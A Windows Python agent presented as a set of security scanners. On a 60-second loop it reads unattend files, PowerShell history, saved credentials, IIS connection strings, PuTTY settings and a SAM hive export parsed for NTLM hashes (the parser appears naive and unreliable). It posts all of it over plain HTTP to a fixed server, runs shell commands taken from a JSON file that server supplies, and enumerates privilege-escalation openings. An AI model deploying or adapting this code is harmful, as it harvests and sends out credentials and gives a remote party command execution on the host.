import subprocess
import time
import json
import os
import re
import winreg
import binascii
import struct
from datetime import datetime
import logging
import requests
import threading
import schedule

# Server details
sleep_timer = 60
SERVER_IP = "192.168.1.71:5000"
ACCOUNT_SERVER_URL = f"http://{SERVER_IP}/api/user-account-backdoor-detection"
SERVICE_SERVER_URL = f"http://{SERVER_IP}/api/service-changes"
CVE_SERVER_URL = f"http://{SERVER_IP}/api/cve-detection"
CRED_SERVER_URL = f"http://{SERVER_IP}/api/scanned-credentials"
REG_SERVER_URL = f"http://{SERVER_IP}/api/backdoor-reg-tamper"
PRIV_SERVER_URL = f"http://{SERVER_IP}/api/privilege-escalation"
cve_json_url = f"http://{SERVER_IP}/static/cve_checks.json"

# Files for persistent storage
ACCOUNT_DATA_FILE = "previous_accounts.json"
SERVICE_DATA_FILE = "previous_services.json"
TEMP_SAM_FILE = "temp_sam.hiv"

# Setup logging for CVE scanner
logging.basicConfig(
    filename="cve_scanner.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger()

# Global variable for registry scanner
PREV_REG_SCAN = None

# Generic server send function
def send_to_server(url, data):
    """Sends data to the specified server endpoint in JSON format."""
    try:
        payload = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "results": data
        }
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"[{payload['timestamp']}] Data sent to {url} successfully.")
        else:
            print(f"[{payload['timestamp']}] Failed to send data to {url}: {response.status_code} - {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"[{payload['timestamp']}] Error sending data to {url}: {e}")

# Account Monitoring Functions
def get_user_accounts_and_groups():
    """Fetches the list of user accounts and their group memberships."""
    user_command = 'powershell "Get-LocalUser | Select-Object Name, Enabled | ConvertTo-Json -Depth 1"'
    user_result = subprocess.run(user_command, shell=True, capture_output=True, text=True)
    
    if user_result.stderr:
        print(f"Error fetching users: {user_result.stderr}")
        return {}
    
    try:
        users = json.loads(user_result.stdout)
        if not isinstance(users, list):
            users = [users] if isinstance(users, dict) else []
    except json.JSONDecodeError as e:
        print(f"Error decoding user data: {user_result.stdout} - {e}")
        return {}

    accounts = {}
    for user in users:
        name = user.get("Name")
        if not name:
            continue
        
        group_command = (
            f'powershell "Get-LocalGroup | ForEach-Object {{ if (Get-LocalGroupMember -Group $_ -ErrorAction SilentlyContinue | Where-Object {{ $_.Name -eq \'{name}\' }}) {{ $_.Name }} }} | Where-Object {{ $_ }} | ConvertTo-Json"'
        )
        group_result = subprocess.run(group_command, shell=True, capture_output=True, text=True)
        
        if group_result.stderr:
            print(f"Error fetching groups for {name}: {group_result.stderr}")
            groups = []
        else:
            try:
                groups = json.loads(group_result.stdout if group_result.stdout else "[]")
                if not isinstance(groups, list):
                    groups = [groups] if isinstance(groups, str) else []
            except json.JSONDecodeError as e:
                print(f"Error decoding group data for {name}: {group_result.stdout} - {e}")
                groups = []

        accounts[name] = {
            "Enabled": user.get("Enabled", "Unknown"),
            "Groups": sorted(groups)
        }
    
    return accounts

def load_previous_accounts():
    """Loads previously saved accounts."""
    if not os.path.exists(ACCOUNT_DATA_FILE):
        return None
    try:
        with open(ACCOUNT_DATA_FILE, "r", encoding="utf-8") as file:
            data = json.load(file)
            return data if isinstance(data, dict) else {}
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"Error loading previous accounts: {e}")
        return {}

def save_current_accounts(accounts):
    """Saves the current accounts to a file."""
    if accounts:
        with open(ACCOUNT_DATA_FILE, "w", encoding="utf-8") as file:
            json.dump(accounts, file, indent=4)

def detect_account_changes(prev_accounts, curr_accounts):
    """Detects added accounts and group membership changes."""
    changes = []
    if prev_accounts is None:
        return changes

    new_accounts = set(curr_accounts.keys()) - set(prev_accounts.keys())
    for name in new_accounts:
        details = curr_accounts[name]
        changes.append({
            "type": "added",
            "account_name": name,
            "enabled": details.get("Enabled", "Unknown"),
            "groups": details["Groups"]
        })
    
    common_accounts = set(prev_accounts.keys()) & set(curr_accounts.keys())
    for name in common_accounts:
        prev_groups = set(prev_accounts[name]["Groups"])
        curr_groups = set(curr_accounts[name]["Groups"])
        
        added_groups = curr_groups - prev_groups
        if added_groups:
            changes.append({
                "type": "group_added",
                "account_name": name,
                "groups": list(added_groups)
            })
        
        removed_groups = prev_groups - curr_groups
        if removed_groups:
            changes.append({
                "type": "group_removed",
                "account_name": name,
                "groups": list(removed_groups)
            })
        
        prev_enabled = prev_accounts[name].get("Enabled", "Unknown")
        curr_enabled = curr_accounts[name].get("Enabled", "Unknown")
        if prev_enabled != curr_enabled:
            changes.append({
                "type": "status_changed",
                "account_name": name,
                "old_status": prev_enabled,
                "new_status": curr_enabled
            })

    return changes

def monitor_accounts():
    """Monitors accounts and returns changes."""
    first_run = not os.path.exists(ACCOUNT_DATA_FILE)
    prev_accounts = load_previous_accounts()
    curr_accounts = get_user_accounts_and_groups()
    
    if first_run:
        print("First run (accounts): Saving initial state.")
        save_current_accounts(curr_accounts)
        return []
    else:
        changes = detect_account_changes(prev_accounts, curr_accounts)
        if changes:
            save_current_accounts(curr_accounts)
        return changes

# Service Monitoring Functions
def get_services():
    """Fetches Windows services and their binary paths."""
    command = 'powershell "Get-WmiObject Win32_Service | Select-Object Name, DisplayName, PathName | ConvertTo-Json -Depth 1"'
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    try:
        services = json.loads(result.stdout)
        if isinstance(services, list):
            return {svc["Name"]: svc for svc in services if svc["Name"]}
        elif isinstance(services, dict):
            return {services["Name"]: services} if "Name" in services else {}
        else:
            return {}
    except json.JSONDecodeError:
        return {}

def load_previous_services():
    """Loads previously saved services."""
    if not os.path.exists(SERVICE_DATA_FILE):
        return None
    try:
        with open(SERVICE_DATA_FILE, "r", encoding="utf-8") as file:
            data = json.load(file)
            return data if isinstance(data, dict) else {}
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_current_services(services):
    """Saves the current services to a file."""
    if services:
        with open(SERVICE_DATA_FILE, "w", encoding="utf-8") as file:
            json.dump(services, file, indent=4)

def detect_service_changes(prev_services, curr_services):
    """Detects only added services and binary path changes."""
    changes = []
    if prev_services is None:
        return changes

    new_services = set(curr_services.keys()) - set(prev_services.keys())
    for name in new_services:
        details = curr_services[name]
        changes.append({
            "type": "added",
            "service_name": name,
            "display_name": details.get("DisplayName", "Unknown"),
            "binary_path": details.get("PathName", "Unknown")
        })
    
    for name in prev_services:
        if name in curr_services:
            prev_path = prev_services[name].get("PathName", "Unknown")
            curr_path = curr_services[name].get("PathName", "Unknown")
            if prev_path != curr_path:
                changes.append({
                    "type": "binary_path_changed",
                    "service_name": name,
                    "old_path": prev_path,
                    "new_path": curr_path
                })
    
    return changes

def monitor_services():
    """Monitors services and returns changes."""
    first_run = not os.path.exists(SERVICE_DATA_FILE)
    prev_services = load_previous_services()
    curr_services = get_services()
    
    if first_run:
        print("First run (services): Saving initial state.")
        save_current_services(curr_services)
        return []
    else:
        changes = detect_service_changes(prev_services, curr_services)
        if changes:
            save_current_services(curr_services)
        return changes

# CVE Scanner Functions
def run_command(command, shell=True):
    """Executes a command silently and returns its output."""
    try:
        result = subprocess.run(command, shell=shell, capture_output=True, text=True, timeout=30)
        if result.stdout:
            output = result.stdout.strip()
            logger.debug(f"Command '{command}' output: {output}")
            return output
        error = result.stderr.strip() if result.stderr else "No output."
        logger.warning(f"Command '{command}' failed: {error}")
        return f"Error: {error}"
    except subprocess.TimeoutExpired:
        logger.error(f"Command '{command}' timed out after 30 seconds.")
        return "Error: Command timed out."
    except Exception as e:
        logger.error(f"Command '{command}' execution failed: {e}")
        return f"Error: {e}"

def load_cve_data():
    """Loads CVE data from the server URL."""
    try:
        response = requests.get(cve_json_url, timeout=10)
        response.raise_for_status()  # Check for HTTP errors
        cve_data = response.json()        
        if not isinstance(cve_data, list):
            raise ValueError("JSON must be a list of CVE entries.")
        
        logger.info(f"Loaded {len(cve_data)} CVE entries from {cve_json_url}")
        return cve_data
    except requests.exceptions.RequestException as e:
        error_msg = f"Error: Failed to download CVE JSON from '{cve_json_url}': {e}"
        send_to_server(CVE_SERVER_URL, {"error": error_msg})
        logger.error(error_msg)
        return None
    except json.JSONDecodeError as e:
        error_msg = f"Error: Invalid JSON format in '{cve_json_url}': {e}"
        send_to_server(CVE_SERVER_URL, {"error": error_msg})
        logger.error(error_msg)
        return None
    except Exception as e:
        error_msg = f"Error loading '{cve_json_url}': {e}"
        send_to_server(CVE_SERVER_URL, {"error": error_msg})
        logger.error(error_msg)
        return None

def check_cve(cve_entry, cached_outputs=None):
    """Checks a single CVE entry for vulnerability."""
    if cached_outputs is None:
        cached_outputs = {}

    cve_id = cve_entry.get("cve_id", "Unknown")
    command = cve_entry.get("command")
    match_word = cve_entry.get("output_match_word")
    patch_check = cve_entry.get("patch_check")
    patch_missing_match = cve_entry.get("patch_missing_match", "")
    description = cve_entry.get("description", "No description provided.")
    requires_admin = cve_entry.get("requires_admin", False)

    if not all([cve_id, command, match_word]):
        logger.warning(f"CVE {cve_id}: Missing required fields.")
        return {"cve_id": cve_id, "status": "Error", "message": "Missing required fields"}

    if command in cached_outputs:
        output = cached_outputs[command]
    else:
        output = run_command(command)
        cached_outputs[command] = output

    is_vulnerable = False
    if "Error" not in output:
        if cve_entry.get("match_type", "contains") == "regex":
            is_vulnerable = bool(re.search(match_word, output))
        else:
            is_vulnerable = match_word in output

    patch_status = {}
    if patch_check and is_vulnerable:
        if patch_check in cached_outputs:
            patch_output = cached_outputs[patch_check]
        else:
            patch_output = run_command(patch_check)
            cached_outputs[patch_check] = patch_output
        if "Error" not in patch_output:
            patch_applied = patch_missing_match not in patch_output
            patch_status = {"patch_check": patch_check, "patch_output": patch_output, "patch_applied": patch_applied}
            is_vulnerable = is_vulnerable and not patch_applied
        else:
            patch_status = {"patch_check_failed": patch_output}

    if is_vulnerable:
        result = {
            "cve_id": cve_id,
            "description": description,
            "command": command,
            "output": output,
            "vulnerability_condition": f"'{match_word}' found in output"
        }
        if patch_status:
            result["patch_status"] = patch_status
        if requires_admin:
            result["note"] = "Requires admin privileges for full exploitation"
        logger.info(f"CVE {cve_id}: Vulnerable system detected.")
        return result
    else:
        logger.debug(f"CVE {cve_id}: Not vulnerable.")
        return None

def scan_cves():
    """Scans all CVEs and sends results to the server."""
    cve_data = load_cve_data()
    if not cve_data:
        return

    cached_outputs = {}
    vulnerable_cves = []
    non_vulnerable_count = 0

    for cve in cve_data:
        result = check_cve(cve, cached_outputs)
        if result:
            vulnerable_cves.append(result)
        else:
            non_vulnerable_count += 1

    data = {
        "vulnerabilities": vulnerable_cves,
        "summary": {
            "total_cves_checked": len(cve_data),
            "vulnerable": len(vulnerable_cves),
            "not_vulnerable": non_vulnerable_count,
            "message": "No vulnerabilities detected" if not vulnerable_cves else ""
        }
    }
    send_to_server(CVE_SERVER_URL, data)

# Credential Theft Scanner Functions
def check_file_exists(file_path):
    """Checks if a file exists and returns its contents if readable."""
    if os.path.exists(file_path):
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                return f.read().strip()
        except Exception as e:
            return f"Error reading file: {e}"
    return None

def scan_unattend_files():
    """Scans unattended installation files for credentials."""
    paths = [
        r"C:\Unattend.xml",
        r"C:\Windows\Panther\Unattend.xml",
        r"C:\Windows\Panther\Unattend\Unattend.xml",
        r"C:\Windows\system32\sysprep.inf",
        r"C:\Windows\system32\sysprep\sysprep.xml"
    ]
    results = []
    for path in paths:
        content = check_file_exists(path)
        if content:
            results.append({"file": path, "content": content})
    return {"unattend_files": results}

def scan_powershell_history():
    """Scans PowerShell command history for credentials."""
    userprofile = os.environ.get("USERPROFILE")
    history_file = f"{userprofile}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"
    content = check_file_exists(history_file)
    if content:
        return {"powershell_history": {"file": history_file, "content": content}}
    return {"powershell_history": {"file": history_file, "content": "Not found or inaccessible"}}

def scan_saved_credentials():
    """Scans saved Windows credentials using cmdkey."""
    output = run_command("cmdkey /list")
    return {"saved_credentials": output}

def scan_iis_config():
    """Scans IIS web.config files for connection strings."""
    paths = [
        r"C:\inetpub\wwwroot\web.config",
        r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config"
    ]
    results = []
    for path in paths:
        content = check_file_exists(path)
        if content:
            command = f'type "{path}" | findstr connectionString'
            output = run_command(command)
            results.append({"file": path, "connection_strings": output})
    return {"iis_config": results}

def scan_putty_credentials():
    """Scans PuTTY registry for proxy credentials."""
    command = 'reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f "Proxy" /s'
    output = run_command(command)
    return {"putty_credentials": output}

def export_sam_hive():
    """Exports the SAM hive from the registry."""
    if os.path.exists(TEMP_SAM_FILE):
        os.remove(TEMP_SAM_FILE)
    
    command = f"reg save HKEY_LOCAL_MACHINE\\SAM {TEMP_SAM_FILE}"
    output = run_command(command)
    if "Error" in output or not os.path.exists(TEMP_SAM_FILE):
        return False, output
    return True, "SAM hive exported successfully."

def parse_sam_file():
    """Parses the exported SAM file to extract user hashes."""
    if not os.path.exists(TEMP_SAM_FILE):
        return "SAM file not found."

    try:
        with open(TEMP_SAM_FILE, "rb") as f:
            sam_data = f.read()
    except Exception as e:
        return f"Error reading SAM file: {e}"

    users = []
    offset = 0
    while offset < len(sam_data):
        if sam_data[offset:offset+4] == b"\x01\x00\x00\x00":
            try:
                rid = struct.unpack("<I", sam_data[offset+4:offset+8])[0]
                name_len = struct.unpack("<H", sam_data[offset+12:offset+14])[0]
                name = sam_data[offset+16:offset+16+name_len].decode("utf-16le").rstrip("\x00")
                hash_offset = offset + 16 + name_len + 8
                if hash_offset + 16 <= len(sam_data):
                    ntlm_hash = binascii.hexlify(sam_data[hash_offset:hash_offset+16]).decode("ascii")
                    users.append({"username": name, "rid": rid, "ntlm_hash": ntlm_hash})
            except Exception:
                pass
        offset += 1

    if not users:
        return "No user hashes found."
    return users

def scan_sam_hashes():
    """Extracts SAM hashes from the registry."""
    if not os.path.exists("C:\\Windows\\System32\\config\\SAM"):
        return {"sam_hashes": {"export": "Error: Run as Administrator", "hashes": []}}

    success, export_result = export_sam_hive()
    if not success:
        return {"sam_hashes": {"export": export_result, "hashes": []}}

    hash_data = parse_sam_file()
    if isinstance(hash_data, str):
        result = {"export": export_result, "hashes": hash_data}
    else:
        result = {"export": export_result, "hashes": hash_data}

    if os.path.exists(TEMP_SAM_FILE):
        os.remove(TEMP_SAM_FILE)
    
    return {"sam_hashes": result}

def scan_credential_manager():
    """Scans Credential Manager files for presence."""
    userprofile = os.environ.get("USERPROFILE")
    cred_dir = f"{userprofile}\\AppData\\Local\\Microsoft\\Credentials"
    if os.path.exists(cred_dir):
        command = f'dir "{cred_dir}"'
        output = run_command(command)
        return {"credential_manager": {
            "directory": cred_dir,
            "files": output,
            "note": "Credentials are encrypted; use tools like Mimikatz to decrypt."
        }}
    return {"credential_manager": {"directory": cred_dir, "content": "Not found"}}

def scan_credentials():
    """Runs all credential theft scans and sends results."""
    results = {
        "scan_initiated_by": os.environ.get("USERNAME", "Unknown"),
        "unattend_files": scan_unattend_files()["unattend_files"],
        "powershell_history": scan_powershell_history()["powershell_history"],
        "saved_credentials": scan_saved_credentials()["saved_credentials"],
        "iis_config": scan_iis_config()["iis_config"],
        "putty_credentials": scan_putty_credentials()["putty_credentials"],
        "sam_hashes": scan_sam_hashes()["sam_hashes"],
        "credential_manager": scan_credential_manager()["credential_manager"]
    }
    send_to_server(CRED_SERVER_URL, results)

# Registry Scanner Functions
REG_PATHS = {
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run (HKCU)": winreg.HKEY_CURRENT_USER,
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run (HKLM)": winreg.HKEY_LOCAL_MACHINE,
    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce (HKCU)": winreg.HKEY_CURRENT_USER,
    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce (HKLM)": winreg.HKEY_LOCAL_MACHINE
}

def scan_registry():
    """Scan the specified registry paths."""
    results = []
    for path, hive in REG_PATHS.items():
        try:
            key = winreg.OpenKey(hive, path.split(" (")[0], 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    entry = {"path": path, "name": name, "value": str(value)}
                    results.append(entry)
                    i += 1
                except OSError:
                    break
            winreg.CloseKey(key)
            if not i:
                results.append({"path": path, "status": "No startup entries (safe)"})
        except FileNotFoundError:
            results.append({"path": path, "status": "Key not found (safe)"})
        except PermissionError:
            results.append({"path": path, "status": "Permission denied - Run as Administrator"})
        except Exception as e:
            results.append({"path": path, "status": f"Unexpected error: {str(e)}"})
    return results

def compare_registry_scans(prev_scan, curr_scan):
    """Compare previous and current registry scans."""
    if prev_scan is None:
        return {"message": "No previous scan to compare", "changes": []}

    changes = []
    prev_dict = {f"{entry['path']}_{entry.get('name', '')}": entry for entry in prev_scan}
    curr_dict = {f"{entry['path']}_{entry.get('name', '')}": entry for entry in curr_scan}

    for prev_key, prev_entry in prev_dict.items():
        if prev_key not in curr_dict:
            changes.append({"type": "removed", "entry": prev_entry})

    for curr_key, curr_entry in curr_dict.items():
        if curr_key not in prev_dict:
            changes.append({"type": "added", "entry": curr_entry})
        elif curr_entry.get("value") != prev_dict[curr_key].get("value"):
            changes.append({
                "type": "edited",
                "entry": curr_entry,
                "old_value": prev_dict[curr_key].get("value")
            })

    message = "Changes detected" if changes else "No changes detected"
    return {"message": message, "changes": changes}

def registry_scan_job():
    """Job to scan and compare registry entries."""
    global PREV_REG_SCAN
    curr_scan = scan_registry()
    
    if PREV_REG_SCAN is not None:
        comparison = compare_registry_scans(PREV_REG_SCAN, curr_scan)
        if comparison["changes"]:
            send_to_server(REG_SERVER_URL, comparison)
    PREV_REG_SCAN = curr_scan

# Privilege Escalation Scanner Functions
def check_file_permissions(path):
    """Checks if a file or directory is writable by the current user."""
    output = run_command(f"icacls \"{path}\"")
    if "Everyone:(F)" in output or "Users:(F)" in output or f"{os.environ.get('USERNAME')}:(F)" in output:
        return True, output
    return False, "No writable permissions found."

def check_registry_permissions(key_path):
    """Checks if a registry key is writable."""
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_ALL_ACCESS)
        winreg.CloseKey(key)
        return True, f"Writable: {key_path}"
    except PermissionError:
        return False, "No writable permissions."
    except Exception as e:
        return False, f"Error: {e}"

def scan_user_privileges():
    """Scans for vulnerable user privileges."""
    output = run_command("whoami /priv")
    vulnerable_privs = ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeTcbPrivilege", 
                        "SeBackupPrivilege", "SeRestorePrivilege", "SeDebugPrivilege"]
    found = [priv for priv in vulnerable_privs if priv in output and "Enabled" in output.split(priv)[1].split("\n")[0]]
    if found:
        return {"user_privileges": {"vulnerable_privileges": found, "details": output}}
    return {}

def scan_group_membership():
    """Scans for privileged group membership."""
    output = run_command("whoami /groups")
    if "Administrators" in output or "Backup Operators" in output or "Server Operators" in output:
        return {"group_membership": {"status": "Vulnerable", "details": output}}
    return {}

def scan_token_info():
    """Scans for elevated token information."""
    output = run_command("whoami /all")
    if "Token Elevation Type" in output and "TokenElevationTypeFull" in output:
        return {"token_information": {"status": "Vulnerable", "note": "Full admin token available with UAC bypass potential"}}
    return {}

def scan_file_permissions():
    """Scans for writable system directories."""
    paths = [r"C:\Windows", r"C:\Program Files"]
    results = []
    for path in paths:
        writable, details = check_file_permissions(path)
        if writable:
            results.append({"path": path, "details": details})
    if results:
        return {"file_permissions": results}
    return {}

def scan_service_binary_permissions():
    """Scans for writable service binaries."""
    services = run_command("wmic service get name,pathname").splitlines()[1:]
    results = []
    for line in services:
        if not line.strip():
            continue
        parts = line.split(None, 1)
        if len(parts) < 2:
            continue
        name, path = parts[0], parts[1].strip()
        if os.path.exists(path):
            writable, details = check_file_permissions(path)
            if writable:
                results.append({"service": name, "path": path, "details": details})
    if results:
        return {"service_binary_permissions": results}
    return {}

def scan_registry_permissions():
    """Scans for writable registry keys."""
    key_path = r"SYSTEM\CurrentControlSet\Services"
    writable, details = check_registry_permissions(key_path)
    if writable:
        return {"registry_permissions": {"key": key_path, "details": details}}
    return {}

def scan_unquoted_service_paths():
    """Scans for unquoted service paths."""
    services = run_command("wmic service get name,pathname").splitlines()[1:]
    results = []
    for line in services:
        if not line.strip():
            continue
        parts = line.split(None, 1)
        if len(parts) < 2:
            continue
        name, path = parts[0], parts[1].strip()
        if " " in path and not (path.startswith('"') and path.endswith('"')):
            results.append({"service": name, "path": path})
    if results:
        return {"unquoted_service_paths": results}
    return {}

def scan_service_dll_hijacking():
    """Scans for DLL hijacking opportunities in service directories."""
    services = run_command("wmic service get name,pathname").splitlines()[1:]
    results = []
    for line in services:
        if not line.strip():
            continue
        parts = line.split(None, 1)
        if len(parts) < 2:
            continue
        name, path = parts[0], parts[1].strip()
        dir_path = os.path.dirname(path)
        if os.path.exists(dir_path):
            writable, _ = check_file_permissions(dir_path)
            if writable:
                results.append({"service": name, "path": path, "note": "Directory writable for DLL planting"})
    if results:
        return {"service_dll_hijacking": results}
    return {}

def scan_service_restart_permissions():
    """Scans for services with restart permissions."""
    services = run_command("sc query type= service state= all").splitlines()
    results = []
    for line in services:
        if "SERVICE_NAME" in line:
            name = line.split(":")[1].strip()
            sd = run_command(f"sc sdshow {name}")
            if "S:(AU;FA;KA" in sd or "RP" in sd:
                results.append({"service": name, "dacl": sd})
    if results:
        return {"service_restart_permissions": results}
    return {}

def scan_always_install_elevated():
    """Scans for AlwaysInstallElevated setting."""
    keys = [
        r"SOFTWARE\Policies\Microsoft\Windows\Installer",
        r"SOFTWARE\Policies\Microsoft\Windows\Installer"
    ]
    results = []
    for key in keys:
        for hive, prefix in [(winreg.HKEY_LOCAL_MACHINE, "HKLM"), (winreg.HKEY_CURRENT_USER, "HKCU")]:
            try:
                reg_key = winreg.OpenKey(hive, key)
                value, _ = winreg.QueryValueEx(reg_key, "AlwaysInstallElevated")
                if value == 1:
                    results.append(f"{prefix}\\{key}")
                winreg.CloseKey(reg_key)
            except FileNotFoundError:
                pass
            except Exception as e:
                results.append(f"Error checking {prefix}\\{key}: {str(e)}")
    if results:
        return {"always_install_elevated": results}
    return {}

def scan_weak_path():
    """Scans for writable PATH entries."""
    path = os.environ.get("PATH").split(";")
    results = []
    for p in path:
        if p and os.path.exists(p):
            writable, details = check_file_permissions(p)
            if writable:
                results.append({"path": p, "details": details})
    if results:
        return {"weak_path_environment": results}
    return {}

def scan_autorun_programs():
    """Scans for writable autorun programs."""
    keys = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    ]
    results = []
    for key in keys:
        for hive, prefix in [(winreg.HKEY_LOCAL_MACHINE, "HKLM"), (winreg.HKEY_CURRENT_USER, "HKCU")]:
            try:
                reg_key = winreg.OpenKey(hive, key)
                i = 0
                while True:
                    name, value, _ = winreg.EnumValue(reg_key, i)
                    if os.path.exists(value):
                        writable, details = check_file_permissions(value)
                        if writable:
                            results.append({"key": f"{prefix}\\{key}", "name": name, "path": value, "details": details})
                    i += 1
            except WindowsError:
                break
            except Exception as e:
                results.append({"key": f"{prefix}\\{key}", "error": str(e)})
    if results:
        return {"autorun_programs": results}
    return {}

def scan_installed_drivers():
    """Scans for vulnerable drivers."""
    output = run_command("driverquery")
    drivers = output.splitlines()[4:]
    vulnerable_drivers = {"capcom.sys": "CVE-2016-7255", "vboxdrv.sys": "VirtualBox Exploit"}
    results = []
    for line in drivers:
        if not line.strip():
            continue
        driver = line.split()[0].lower()
        if driver in vulnerable_drivers:
            results.append({"driver": driver, "cve": vulnerable_drivers[driver]})
    if results:
        return {"installed_drivers": results}
    return {}

def scan_driver_permissions():
    """Scans for writable driver directory."""
    driver_dir = r"C:\Windows\System32\drivers"
    writable, details = check_file_permissions(driver_dir)
    if writable:
        return {"driver_permissions": {"path": driver_dir, "details": details}}
    return {}

def scan_uac_settings():
    """Scans UAC settings for vulnerabilities."""
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
        consent, _ = winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")
        lua, _ = winreg.QueryValueEx(key, "EnableLUA")
        if consent == 0 and lua == 1:
            return {"uac_settings": {"status": "Vulnerable", "note": "UAC set to no prompt, elevation possible"}}
        winreg.CloseKey(key)
    except Exception as e:
        return {"uac_settings": {"error": str(e)}}
    return {}

def scan_applocker():
    """Scans for writable AppLocker policy."""
    key_path = r"SOFTWARE\Policies\Microsoft\Windows\SrpV2"
    writable, details = check_registry_permissions(key_path)
    if writable:
        return {"applocker_misconfiguration": {"key": key_path, "details": details}}
    return {}

def scan_defender_exclusions():
    """Scans for writable Defender exclusion paths."""
    key = winreg.HKEY_LOCAL_MACHINE
    subkey = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    results = []
    try:
        reg_key = winreg.OpenKey(key, subkey)
        i = 0
        while True:
            name, value, _ = winreg.EnumValue(reg_key, i)
            if os.path.exists(name):
                writable, details = check_file_permissions(name)
                if writable:
                    results.append({"path": name, "details": details})
            i += 1
    except WindowsError:
        pass
    except Exception as e:
        results.append({"error": str(e)})
    if results:
        return {"defender_exclusions": results}
    return {}

def scan_stored_credentials():
    """Scans for stored credentials."""
    output = run_command("cmdkey /list")
    if "Target:" in output:
        return {"stored_credentials": {"details": output}}
    return {}

def scan_cve_vulnerabilities():
    """Scans for specific CVE vulnerabilities."""
    systeminfo = run_command("systeminfo")
    patches = run_command("wmic qfe list")
    cve_checks = {
        "CVE-2021-1732": ("10.0.19041" not in systeminfo and "KB5000802" not in patches, "Win32k elevation vulnerability"),
        "CVE-2020-1472": ("KB4571729" not in patches, "ZeroLogon vulnerability"),
        "CVE-2021-34527": ("Spooler" in run_command("sc query") and "KB5004945" not in patches, "PrintNightmare vulnerability")
    }
    results = []
    for cve, (condition, desc) in cve_checks.items():
        if condition:
            results.append({"cve": cve, "description": desc})
    if results:
        return {"cve_vulnerabilities": results}
    return {}

def scan_startup_folders():
    """Scans for writable startup folders."""
    paths = [
        r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp",
        os.path.expandvars(r"%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    ]
    results = []
    for path in paths:
        writable, details = check_file_permissions(path)
        if writable:
            results.append({"path": path, "details": details})
    if results:
        return {"startup_folders": results}
    return {}

def scan_dll_hijacking():
    """Scans for DLL hijacking opportunities."""
    paths = [r"C:\Windows", r"C:\Windows\System32"]
    results = []
    for path in paths:
        writable, details = check_file_permissions(path)
        if writable:
            results.append({"path": path, "details": details, "note": "Potential DLL planting opportunity"})
    if results:
        return {"dll_hijacking": results}
    return {}

def scan_weak_service_accounts():
    """Scans for services running as user accounts."""
    services = run_command("wmic service get name,startname").splitlines()[1:]
    results = []
    for line in services:
        if not line.strip():
            continue
        parts = line.split(None, 1)
        if len(parts) < 2:
            continue
        name, startname = parts[0], parts[1].strip()
        if "LocalSystem" not in startname and "NT AUTHORITY" not in startname and startname:
            results.append({"service": name, "runs_as": startname})
    if results:
        return {"weak_service_accounts": results}
    return {}

def scan_privileges():
    """Runs all privilege escalation scans and sends results."""
    results = {
        "scan_initiated_by": os.environ.get("USERNAME", "Unknown"),
        **scan_user_privileges(),
        **scan_group_membership(),
        **scan_token_info(),
        **scan_file_permissions(),
        **scan_service_binary_permissions(),
        **scan_registry_permissions(),
        **scan_unquoted_service_paths(),
        **scan_service_dll_hijacking(),
        **scan_service_restart_permissions(),
        **scan_always_install_elevated(),
        **scan_weak_path(),
        **scan_autorun_programs(),
        **scan_installed_drivers(),
        **scan_driver_permissions(),
        **scan_uac_settings(),
        **scan_applocker(),
        **scan_defender_exclusions(),
        **scan_stored_credentials(),
        **scan_cve_vulnerabilities(),
        **scan_startup_folders(),
        **scan_dll_hijacking(),
        **scan_weak_service_accounts()
        
    }
    print("test111111111111111111111111")
    if len(results) > 1:  # More than just "scan_initiated_by"
        send_to_server(PRIV_SERVER_URL, results)

# Main execution
def run_all_scanners():
    """Runs all scanners in a loop every 60 seconds."""
    print("Starting all security scanners...")
    
    while True:
        try:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Starting scan cycle...")
            
            # Account monitoring
            account_changes = monitor_accounts()
            if account_changes:
                send_to_server(ACCOUNT_SERVER_URL, {"changes": account_changes})
            else:
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] No account changes detected.")

            # Service monitoring
            service_changes = monitor_services()
            if service_changes:
                send_to_server(SERVICE_SERVER_URL, {"changes": service_changes})
            else:
                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] No service changes detected.")

            # CVE scanner
            scan_cves()

            # Credential scanner
            scan_credentials()

            # Registry scanner
            registry_scan_job()

            # Privilege escalation scanner
            scan_privileges()

            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Scan cycle completed. Sleeping for 60 seconds...")
            time.sleep(sleep_timer)
            
        except Exception as e:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Error in scan cycle: {e}")
            send_to_server(ACCOUNT_SERVER_URL, {"error": f"Scan cycle error: {e}"})
            time.sleep(sleep_timer)  # Continue even if there's an error

if __name__ == "__main__":
    try:
        run_all_scanners()
    except KeyboardInterrupt:
        print("\nAll scanners stopped by user.")
    except Exception as e:
        print(f"Critical error: {e}")
